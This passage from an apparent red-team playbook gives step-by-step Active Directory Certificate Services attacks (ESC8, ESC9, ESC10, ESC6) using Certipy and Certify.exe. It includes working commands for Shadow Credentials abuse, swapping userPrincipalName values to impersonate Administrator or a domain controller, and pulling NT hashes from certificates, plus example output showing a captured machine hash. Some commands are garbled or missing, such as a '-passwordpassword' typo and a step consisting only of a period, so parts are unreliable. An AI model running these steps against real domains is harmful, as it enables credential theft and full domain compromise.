				1. Force authentication to the relay server. This step can be completed according to the ([AD Forced Authentication Guide](Testaments_and_Books/Redvelations/Active_Directory/003-1_AD_NTLM_Capture_and_Relay_Attacks.md))
				1. Retrieve NTLM Hash and Kerberos information using the certificate.

						certipy auth -pfx 'dc01$_microsoftdelivery$_microsoftdelive.pfx' -dc-ip 10.0.0.1
					* Example Output

							Certipy v4.0.0 - by Oliver Lyak (ly4k)

							[*] Found multiple identifications in certificate
							[*] Please select one:
							    [0] DNS Host Name: 'DC01.microsoftdelivery.com'
							    [1] DNS Host Name: 'microsoftdelivery.com'
							    [2] DNS Host Name: 'MICROSOFTDELIVE'
							> 0
							[*] Using principal: dc01$@microsoftdelivery.com
							[*] Trying to get TGT...
							[*] Got TGT
							[*] Saved credential cache to 'dc01.ccache'
							[*] Trying to retrieve NT hash for 'dc01$'
							[*] Got hash for 'dc01$@microsoftdelivery.com': aad3b435b51404eeaad3b435b51404ee:94f2721f78c81bb17b4e3b39acb1cba0
	* ESC9 (Needs Research/Testing)
		* <details><summary>References (Click to expand)</summary><p>
			* [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
		* <details><summary>Requirements (Click to expand)</summary><p>
		    * `StrongCertificateBindingEnforcement` set to 1 (default) or 0
		    * Certificate contains the `CT_FLAG_NO_SECURITY_EXTENSION` flag in the msPKI-Enrollment-Flag value
		    * Certificate specifies any client authentication EKU
		    * GenericWrite over any account A to compromise any account B
		* <details><summary>Process (Click to expand)</summary><p>
			1. Obtain the hash of Jane with for instance Shadow Credentials (using our GenericWrite).

					certipy shadow auto -username $DOMAIN_USER@$DOMAIN -p password -account jane
			1. Change the userPrincipalName of Jane to be Administrator. Notice that we’re leaving out the @corp.local part. This is not a constraint violation, since the Administrator user’s userPrincipalName is Administrator@corp.local and not Administrator.

					certipy account update -username $DOMAIN_USER@$DOMAIN -password $PASSWORD -user $TARGET_USER -upn administrator
			1. Request the vulnerable certificate template ESC9. We must request the certificate as Jane. Notice that the userPrincipalName in the certificate is Administrator and that the issued certificate contains no “object SID”.

					certipy req -username jane@cor.local -hashes HASH -ca corp-dc-ca -template ESC9
			1. Change back the userPrincipalName of Jane to be something else, like her original userPrincipalName Jane@corp.local.

					certipy account update -username $DOMAIN_USER@$DOMAIN -passwordpassword -user $TARGET_USER -upn jane@corp.local
			1. Now, if we try to authenticate with the certificate, we will receive the NT hash of the Administrator@corp.local user. You will need to add -domain <domain> to your command line since there is no domain specified in the certificate.

					certipy auth -pfx administrator.pfx -domain corp.local
	* ESC10 (Needs Research/Testing)
		* <details><summary>References (Click to expand)</summary><p>
			* [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
		*  Case 1
			* <details><summary>Requirements (Click to expand)</summary><p>
				* `StrongCertificateBindingEnforcement` set to 0
		    	* GenericWrite over any account A to compromise any account B
	    	* <details><summary>Overview (Click to expand)</summary><p>
				* In this case, $DOMAIN_USER@$DOMAIN has GenericWrite over Jane@corp.local, and we wish to compromise Administrator@corp.local. The abuse steps are almost identical to ESC9, except that any certificate template can be used.
			* <details><summary>Recommended: Certipy (Click to expand)</summary><p>
				1. Obtain the hash of Jane with for instance Shadow Credentials (using our GenericWrite).

						certipy shadow auto -username $DOMAIN_USER@$DOMAIN -p password -account jane
				1. Change the userPrincipalName of Jane to be Administrator. Notice that we’re leaving out the @corp.local part. This is not a constraint violation, since the Administrator user’s userPrincipalName is Administrator@corp.local and not Administrator.

						certipy account update -username $DOMAIN_USER@$DOMAIN -password $PASSWORD -user $TARGET_USER -upn administrator
				1. Request any certificate that permits client authentication, for instance the default User template. We must request the certificate as Jane. Notice that the userPrincipalName in the certificate is Administrator.

						certipy req -ca 'cor-dc-ca' -username jane@corp.local -hashes HASH
				1. Change back the userPrincipalName of Jane to be something else, like her original userPrincipalName Jane@corp.local.

						certipy account update -username $DOMAIN_USER@$DOMAIN -password $PASSWORD -user $TARGET_USER -upn jane@corp.local
				1. Authenticate with the certificate and receive the NT hash of the Administrator@corp.local user. You must add -domain <domain> to your command line since there is no domain specified in the certificate.

						.
		* Case 2
			* <details><summary>Requirements (Click to expand)</summary><p>
				* `CertificateMappingMethods` contains UPN bit flag (0x4)
			    * GenericWrite over any account A to compromise any account B without a userPrincipalName property (machine accounts and built-in domain administrator Administrator)
				* In this case, $DOMAIN_USER@$DOMAIN has GenericWrite over Jane@corp.local, and we wish to compromise the domain controller DC$@corp.local.
			* <details><summary>Recommended: Certipy (Click to expand)</summary><p>
				1. First, we obtain the hash of Jane with for instance Shadow Credentials (using our GenericWrite).
				1. Next, we change the userPrincipalName of Jane to be DC$@corp.local. This is not a constraint violation, since the DC$ computer account does not have userPrincipalName.
				1. Now, we request any certificate that permits client authentication, for instance the default User template. We must request the certificate as Jane.
				1. Then, we change back the userPrincipalName of Jane to be something else, like her original userPrincipalName (Jane@corp.local).
				1. Now, since this registry key applies to Schannel, we must use the certificate for authentication via Schannel. This is where Certipy’s new -ldap-shell option comes in.
				1. If we try to authenticate with the certificate and -ldap-shell, we will notice that we’re authenticated as u:CORP\DC$. This is a string that is sent by the server.
				1. One of the available commands for the LDAP shell is set_rbcd which will set Resource-Based Constrained Delegation (RBCD) on the target. So we could perform a RBCD attack to compromise the domain controller.
				1. Alternatively, we can also compromise any user account where there is no userPrincipalName set or where the userPrincipalName doesn’t match the sAMAccountName of that account. From my own testing, the default domain administrator Administrator@corp.local doesn’t have a userPrincipalName set by default, and this account should by default have more privileges in LDAP than domain controllers.

##### Needs Research/Testing

* Zer1t0's GitHub: Certi -<br />[https://github.com/zer1t0/certi](https://github.com/zer1t0/certi)


#### From a Windows Machine
##### Remote

* ESC1
* ESC2
* ESC3
* ESC4
* ESC5
* ESC6
	* <details><summary>Recommended: Certify.exe (Click to expand)</summary><p>

			Certify.exe request /ca:'domain\ca' /template:"Certificate template" /altname:"admin"
* ESC7
* ESC8



##### Domain-Joined Only



### Needs Research

* <details><summary>Needs Research (Click to expand)</summary><p>
	* Harmjoy Twitter Status
		* [https://twitter.com/harmj0y/status/1458475570187182082](https://twitter.com/harmj0y/status/1458475570187182082)
	* ESC1 Tips from "domchell"
		* Dominic Chell Script
			* [https://gist.github.com/dmchell/5eb871f052db13dc38cbb902ea8fb50e](https://gist.github.com/dmchell/5eb871f052db13dc38cbb902ea8fb50e)
			* [https://twitter.com/domchell/status/1440314155462905859](https://twitter.com/domchell/status/1440314155462905859)
			* "ESC1 vuln cert template with PEND_ALL_REQUESTS (meaning enrolment approval reqd) which I also had a write ace on. I couldn't find any existing code to bypass so knocked up this tool to reset the mspki-enrollment-flag attrib to exploit it"